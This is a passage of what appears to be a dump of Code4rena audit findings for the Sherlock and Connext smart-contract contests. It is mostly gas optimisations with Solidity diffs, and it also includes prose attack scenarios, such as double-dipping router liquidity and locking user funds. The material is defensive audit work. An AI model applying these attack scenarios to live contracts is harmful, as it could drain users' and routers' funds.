the result directly. Example: want.approve(address(getLp()), uint256(-1));  "}, {"title": "reputation risks with updateSolution", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/4", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2021-07-sherlock-findings", "body": "reputation risks with updateSolution"}, {"title": "Make variables immutable or constant", "html_url": "https://github.com/code-423n4/2021-07-sherlock-findings/issues/1", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-sherlock-findings", "body": "# Handle  bw   # Vulnerability details  ## Impact The `AaveV2.sol` contract made use of a number of `public` variables that were set only in the constructor and would remain constant. These variables were consuming storage slots, which unnecessarily increased the deployment and runtime gas costs of the contract.  ## Proof of Concept  ### Code Diff  ``` diff --git a/contracts/strategies/AaveV2.sol b/contracts/strategies/AaveV2.sol index 1b6ed56..9592986 100644 --- a/contracts/strategies/AaveV2.sol +++ b/contracts/strategies/AaveV2.sol @@ -21,15 +21,15 @@ import '../interfaces/IStrategy.sol';  contract AaveV2 is IStrategy, Ownable {    using SafeMath for uint256;   -  ILendingPoolAddressesProvider public lpAddressProvider = +  ILendingPoolAddressesProvider public constant lpAddressProvider =      ILendingPoolAddressesProvider(0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5); -  IAaveIncentivesController public aaveIncentivesController; +  IAaveIncentivesController public immutable aaveIncentivesController;   -  ERC20 public override want; -  IAToken public aWant; +  ERC20 public immutable override want; +  IAToken public immutable aWant;   -  address public sherlock; -  address public aaveLmReceiver; +  address public immutable sherlock; +  address public immutable aaveLmReceiver;      modifier onlySherlock() {      require(msg.sender == sherlock, 'sherlock'); @@ -49,7 +49,7 @@ contract AaveV2 is IStrategy, Ownable {      aaveLmReceiver = _aaveLmReceiver;        ILendingPool lp = getLp(); -    want.approve(address(lp), uint256(-1)); +    ERC20(_aWant.UNDERLYING_ASSET_ADDRESS()).approve(address(lp), uint256(-1));    } ```  ### Gas Reporter Diff  ``` diff --git a/base.rst b/immutable.rst index 36b3138..79703fc 100644 --- a/base.rst +++ b/immutable.rst @@ -1,199 +1,199 @@  \u00b7----------------------------------------------------|---------------------------|-------------|-----------------------------\u00b7  |                Solc version: 0.7.6                 \u00b7  Optimizer enabled: true  \u00b7  Runs: 200  \u00b7  Block limit: 12450000 gas  \u2502  \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 -|  Methods                                           \u00b7              100 gwei/gas               \u00b7       2058.77 usd/eth       \u2502 +|  Methods                                           \u00b7              100 gwei/gas               \u00b7       2061.52 usd/eth       \u2502  \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7  |  Contract      \u00b7  Method                           \u00b7  Min        \u00b7  Max        \u00b7  Avg        \u00b7  # calls      \u00b7  usd (avg)  \u2502  \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 -|  AaveV2        \u00b7  claimRewards                     \u00b7     397877  \u00b7     437371  \u00b7     417624  \u00b7            2  \u00b7      85.98  \u2502 +|  AaveV2        \u00b7  claimRewards                     \u00b7     391566  \u00b7     431060  \u00b7     411313  \u00b7            2  \u00b7      84.79  \u2502  \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 -|  AaveV2        \u00b7  deposit                          \u00b7          -  \u00b7          -  \u00b7     278549  \u00b7            4  \u00b7      57.35  \u2502 +|  AaveV2        \u00b7  deposit                          \u00b7          -  \u00b7          -  \u00b7     274205  \u00b7            4  \u00b7      56.53  \u2502  \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 -|  AaveV2        \u00b7  withdraw                         \u00b7     260005  \u00b7     294205  \u00b7     277105  \u00b7            2  \u00b7      57.05  \u2502 +|  AaveV2        \u00b7  withdraw                         \u00b7     253692  \u00b7     287892  \u00b7     270792  \u00b7            2  \u00b7      55.82  \u2502  \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 -|  AaveV2        \u00b7  withdrawAll                      \u00b7      59690  \u00b7     275814  \u00b7     167752  \u00b7            2  \u00b7      34.54  \u2502 +|  AaveV2        \u00b7  withdrawAll                      \u00b7      53349  \u00b7     267370  \u00b7     160360  \u00b7            2  \u00b7      33.06  \u2502  \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 |  Deployments                                       \u00b7                                         \u00b7  % of limit   \u00b7             \u2502  \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7|\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 -|  AaveV2                                            \u00b7          -  \u00b7          -  \u00b7     802248  \u00b7        6.4 %  \u00b7     165.16  \u2502 +|  AaveV2                                            \u00b7          -  \u00b7          -  \u00b7     762851  \u00b7        6.1 %  \u00b7     157.26  \u2502 ```  ### Average Improvements  | Function      | Base      | Immutable | Diff    | |---------------|-----------|-----------|---------| | claimRewards  | 417624    | 411313    | -1.53%  | | deposit       | 278549    | 274205    | -1.58%  | | withdraw      | 277105    | 270792    | -2.33%  | | withdrawAll   | 167752    | 160360    | -4.61%  | | deployment    | 802248    | 762851    | -5.16%  |  By removing the `public` keyword from all variables that are not required (which are only used in the unit tests), the deployment costs can be further reduced to `700206`, which is an 14.57% reduction in gas costs.  ## Tools Used  https://www.npmjs.com/package/hardhat-gas-reporter  ## Recommended Mitigation Steps  Add the `immutable` key word to all variables that are only set during the constructor. Add the `constant` modifier for `lpAddressProvider`.  "}, {"title": "Cache storage variables to local variables to save gas", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/75", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  In general, if a state variable is read more than once, caching its value to a local variable and reusing it will save gas since a storage read spends more gas than a memory write plus a memory read.  ## Proof of Concept  Referenced code: [TransactionManager.sol#L122-L125](https://github.com/code-423n4/2021-07-connext/blob/main/contracts/TransactionManager.sol#L122-L125) [TransactionManager.sol#L254-L260](https://github.com/code-423n4/2021-07-connext/blob/main/contracts/TransactionManager.sol#L254-L260)  ## Recommended Mitigation Steps  Rewrite #L122-L125 as follows:  ```solidity uint256 balance = routerBalances[msg.sender][assetId]; require(balance >= amount, \"removeLiquidity: INSUFFICIENT_FUNDS\");  // Update router balances routerBalances[msg.sender][assetId] = balance - amount; ```  Rewrite #L254-L260 as follows:  ```solidity uint256 balance = routerBalances[invariantData.router][invariantData.receivingAssetId]; require(     balance >= amount,     \"prepare: INSUFFICIENT_LIQUIDITY\" );  // Decrement the router liquidity routerBalances[invariantData.router][invariantData.receivingAssetId] = balance - amount; ```  "}, {"title": "Use the `unchecked` keyword to save gas", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/74", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  Using the `unchecked` keyword to avoid redundant arithmetic underflow/overflow checks to save gas when an underflow/overflow cannot happen.  ## Proof of Concept  We can apply the `unchecked` keyword in the following lines of code since there are `require` statements before to ensure the arithmetic operations would not cause an integer underflow or overflow.  Referenced code: [TransactionManager.sol#L125](https://github.com/code-423n4/2021-07-connext/blob/main/contracts/TransactionManager.sol#L125) [TransactionManager.sol#L260](https://github.com/code-423n4/2021-07-connext/blob/main/contracts/TransactionManager.sol#L260) [TransactionManager.sol#L364](https://github.com/code-423n4/2021-07-connext/blob/main/contracts/TransactionManager.sol#L364) [TransactionManager.sol#L520](https://github.com/code-423n4/2021-07-connext/blob/main/contracts/TransactionManager.sol#L520)  ## Recommended Mitigation Steps  For example, change the code at line 364 to:  ```solidity unchecked {     uint256 toSend = txData.amount - relayerFee; } ```  "}, {"title": "Deflationary and fee-on-transfer tokens are not correctly accounted", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/68", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  When a router adds liquidity to the `TransactionManager`, the manager does not correctly handle the received amount if the transferred token is a deflationary or fee-on-transfer token. The actual received amount is less than that is recorded in the `routerBalances` variable.  ## Proof of Concept  Referenced code: [TransactionManager.sol#L97](https://github.com/code-423n4/2021-07-connext/blob/main/contracts/TransactionManager.sol#L97) [TransactionManager.sol#L101](https://github.com/code-423n4/2021-07-connext/blob/main/contracts/TransactionManager.sol#L101)  ## Recommended Mitigation Steps  Get the received token amount by calculating the difference of token balance before and after the transfer, for example:  ```solidity uint256 balanceBefore = getOwnBalance(assetId); require(LibERC20.transferFrom(assetId, router, address(this), amount, \"addLiquidity: ERC20_TRANSFER_FAILED\"); uint256 receivedAmount = getOwnBalance(assetId) - balanceBefore;  // Update the router balances routerBalances[router][assetId] += receivedAmount; ```  "}, {"title": "Unchangeable chain ID information", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/66", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-connext-findings", "body": "Unchangeable chain ID information"}, {"title": "Increment in the loop can be made unchecked", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/65", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-07-connext-findings", "body": "Increment in the loop can be made unchecked"}, {"title": "Missing @param in fulfill NatSpec", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/64", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  0xsanson   # Vulnerability details  ## Impact The currect implementation of NatSpec of fulfill function lacks @param callData  ## Proof of Concept https://github.com/code-423n4/2021-07-connext/blob/main/contracts/TransactionManager.sol#L302  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps It's suggested to complete adding @param callData  "}, {"title": "Optimizing the for loop", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/60", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-07-connext-findings", "body": "Optimizing the for loop"}, {"title": "Revert strings", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/59", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  hrkrshnn   # Vulnerability details  ## Revert strings  ### Consider using custom errors instead of revert strings  Can save gas when the revert condition has been met. And also during runtime.  ### Consider shortening revert strings to less than 32 bytes  Revert strings more than 32 bytes require at least one additional `mstore`, along with additional operations for computing memory offset, etc.  Even if you need a string to represent an error, it can usually be done in less than 32 bytes / characters.  Here are some examples of strings that can be shortened from codebase:  ``` txt ./contracts/TransactionManager.sol:96:      \"addLiquidity: ETH_WITH_ERC_TRANSFER\" ./contracts/TransactionManager.sol:97:      \"addLiquidity: ERC20_TRANSFER_FAILED\" ./contracts/TransactionManager.sol:122:     \"removeLiquidity: INSUFFICIENT_FUNDS\" ```  Note that this will only decrease runtime gas when the revert condition has been met. Regardless, it will decrease deploy time gas.    "}, {"title": "Relayer txs can be frontrunned", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/58", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-connext-findings", "body": "Relayer txs can be frontrunned"}, {"title": "Don't ask for the user's signature when msg.sender == txData.user", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/57", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact I think it would make sense not to check the user's signature in recoverCancelSignature or recoverFulfillSignature if the caller is the user himself.   ## Recommended Mitigation Steps Replace: require(recoverCancelSignature(txData, relayerFee, signature) == txData.user, \"cancel: INVALID_SIGNATURE\"); require(recoverFulfillSignature(txData, relayerFee, signature) == txData.user, \"fulfill: INVALID_SIGNATURE\"); with: require(msg.sender == txData.user || recoverCancelSignature(txData, relayerFee, signature) == txData.user, \"cancel: INVALID_SIGNATURE\"); require(msg.sender == txData.user || recoverFulfillSignature(txData, relayerFee, signature) == txData.user, \"fulfill: INVALID_SIGNATURE\");  "}, {"title": "Refacotr: Reuse same code for hashVariantTransactionData with txData and when preparedBlockNumber is 0", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/56", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  GalloDaSballo   # Vulnerability details  ## Impact  The code uses `hashVariantTransactionData` to verify the hash of the VariantTransactionData It also uses ```     variantTransactionData[digest] = keccak256(abi.encode(VariantTransactionData({       amount: txData.amount,       expiry: txData.expiry,       preparedBlockNumber: 0     }))); ```  To generate VariantTransactionData with `preparedBlockNumber` set to 0  A simple refactoring of: ```   function hashVariantTransactionData(TransactionData calldata txData) internal pure returns (bytes32) {     return hashVariantTransaction(txData.amount, txData.expiry, txData.preparedBlockNumber)   }    function hashVariantTransaction(uint256 amount, uint256 expiry, uint256 prepareBlocNumber) internal pure returns (bytes32) {     return keccak256(abi.encode(VariantTransactionData({       amount: amount,       expiry: expiry,       preparedBlockNumber: preparedBlockNumber     })));   }  ```  This would allow to further steamline the code from ```     variantTransactionData[digest] = keccak256(abi.encode(VariantTransactionData({       amount: txData.amount,       expiry: txData.expiry,       preparedBlockNumber: 0     }))); ```  to  ```     variantTransactionData[digest] = hashVariantTransaction(txData.amount, txData.expiry, 0) ```  ## Recommended Mitigation Steps This has no particular benefit beside making all code related to Variant Data consistent   "}, {"title": "Signatures use only tx ID instead of entire digest", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/54", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2021-07-connext-findings", "body": "Signatures use only tx ID instead of entire digest"}, {"title": "An attacker can front-run a user\u2019s prepare() tx on sending chain to cause DoS by griefing", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/52", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-07-connext-findings", "body": "An attacker can front-run a user\u2019s prepare() tx on sending chain to cause DoS by griefing"}, {"title": "Missing zero-address checks", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/50", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "Missing zero-address checks"}, {"title": "Lack of guarded launch approach may be risky", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/49", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  The protocol appears to allow arbitrary assets, amounts and routers/users without an initial time-bounded whitelist of assets/routers/users or upper bounds on amounts. Also, there is no pause/unpause functionality. While this lack of ownership and control makes it completely permissionless, it is a risky design because if there are latent protocol vulnerabilities there is no fallback option.  ## Proof of Concept  Lack of owner, whitelisting, thresholds, pause/unpause in the protocol.  See https://medium.com/electric-capital/derisking-defi-guarded-launches-2600ce730e0a  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Consider an initial guarded launch approach to owner-based whitelisting asset types, router/recipient addresses, amount thresholds and adding a pause/unpause functionality for emergency handling. The design should be able to make this owner configurable where the owner can renounce ownership at a later point when the protocol operation is sufficiently time-tested and deemed stable/safe.  "}, {"title": "Anyone can arbitrarily add router liquidity", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/48", "labels": ["bug", "3 (High Risk)", "sponsor acknowledged"], "target": "2021-07-connext-findings", "body": "Anyone can arbitrarily add router liquidity"}, {"title": "Expired transfers will lock user funds on the sending chain", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/47", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  The cancelling relayer is being paid in receivingAssetId on the sendingChain instead of in sendingAssetID. If the user relies on a relayer to cancel transactions and that receivingAssetId asset does not exist on the sending chain (assuming only sendingAssetID on the sending chain and receivingAssetId on the receiving chain are assured to be valid and present) then the cancel transaction from the relayer will always revert and user\u2019s funds will remain locked on the sending chain.  Impact: Expired transfers can never be cancelled and user funds will be locked forever if user relies on a relayer.  ## Proof of Concept  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L510-L517   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Change receivingAssetId to sendingAssetId in transferAsset() on L514.  "}, {"title": "Router liquidity on receiving chain can be double-dipped by the user", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/46", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  During fulfill() on the receiving chain, if the user has set up an external contract at txData.callTo, the catch blocks for both IFulfillHelper.addFunds() and IFulfillHelper.excute() perform transferAsset to the predetermined fallback address txData.receivingAddress.  If addFunds() has reverted earlier, toSend amount would already have been transferred to the receivingAddress. If execute() also fails, it is again transferred.   Scenario: User sets up receiver chain txData.callTo contract such that both addFunds() and execute() calls revert and that will let him get twice the toSend amount credited to the receivingAddress. So effectively, Alice locks 100 tokenAs on chain A and can get 200 tokenAs (or twice the amount of any token she is supposed to get on chainB from the router), minus relayer fee, on chainB. Router liquidity is double-dipped by Alice and router loses funds.  ## Proof of Concept  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L395-L409  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L413-L428  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  The second catch block for execute() should likely not have the transferAsset() call. It seems like a copy-and-paste bug unless there is some reason that is outside the specified scope and documentation for this contest.  "}, {"title": "Checking non-zero value can avoid an external call to save gas", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/45", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact Checking if  `_amount != 0 ` before making the transfer call  can save gas by avoiding the external call in such situations.  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L201-L206  ``` function borrowValue(uint256 _amount, address _to) external onlyMarket override {         debts[msg.sender] += _amount;         totalDebt += _amount;          IERC20(token).safeTransfer(_to, _amount);     }  ```  ## Tools Used Remix  ## Recommended Mitigation Steps Add additional check for non zero ` _amount`.  "}, {"title": "Evaluate security benefit vs gas usage trade-off for using nonreentrant modifier on different functions", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/43", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  While it may be considered extra-safe to have a nonreentrant modifier on all functions making any external calls even though they are to trusted contracts, when functions implement Checks-Effects-Interactions (CEI) pattern, it is helpful to evaluate the perceived security benefit vs gas usage trade-off for using nonreentrant modifier.  Functions adhering to the CEI pattern may consider not having the nonreentrant modifier which does two SSTORES (getting more expensive with the London fork EIP-3529) to its _status state variable.   Example 1: In addLiquidity(), by moving the updating of router balance on L101 to before the transfers from L92, the function would adhere to CEI pattern and could be evaluated to remove the nonreentrant modifier.  Example 2: removeLiquidity() already adheres to CEI pattern and could be evaluated to remove the nonreentrant modifier.  prepare() can be slightly restructured to follow CEI pattern as well. However, fulfill() and cancel() are risky with multiple external calls and its safer to leave the nonreentrant call at the expense of additional gas costs.  Impact: Save gas by removing nonreentrant modifier if function is deemed to be reentrant safe. This can save gas costs of 2 SSTORES per function call that uses this modifier: _status SSTORE from 1 to 2 costs 5000 and _status SSTORE from 2 to 1 which costs 100 (because it was already accessed) which is significant at 5100 per call post-Berlin EIP-2929.   ## Proof of Concept  https://github.com/code-423n4/2021-07-connext/blob/8e1a7ea396d508ed2ebeba4d1898a748255a48d2/contracts/TransactionManager.sol#L92-L101  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Evaluate security benefit vs gas usage trade-off for using nonreentrant modifier on functions that may already be reentrant safe or do not need this protection. It may indeed be safe to leave this modifier (while accepting the gas impact) if such an evaluation is tricky or depends on assumptions.  "}, {"title": "Consolidating library functions can save gas by preventing external calls", "html_url": "https://github.com/code-423n4/2021-07-connext-findings/issues/42", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-connext-findings", "body": "# Handle  0xRajeev   # Vulnerability details  ## Impact  While code modularity is generally a good practice and creating libraries of functions commonly used across different contracts can increase maintainability and reduce contract deployment size/cost, it comes at the increased cost of gas usage at runtime because of the external calls. EIP-2929 in Berlin fork increased the gas costs of CALL* family opcodes to 2600. Making a delegatecall to a library function therefore costs 